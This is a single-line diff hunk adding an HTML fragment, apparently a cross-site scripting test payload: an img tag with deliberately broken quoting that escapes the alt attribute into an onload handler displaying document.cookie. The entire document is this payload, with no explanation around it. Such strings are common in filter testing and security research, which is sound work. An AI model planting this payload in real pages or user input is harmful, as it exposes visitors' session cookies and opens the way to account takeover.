@@ -1,0 +1,1 @@
+<div> <img width="450" height="250" src= "x" alt '" onload="window.alert?.(document.cookie)">
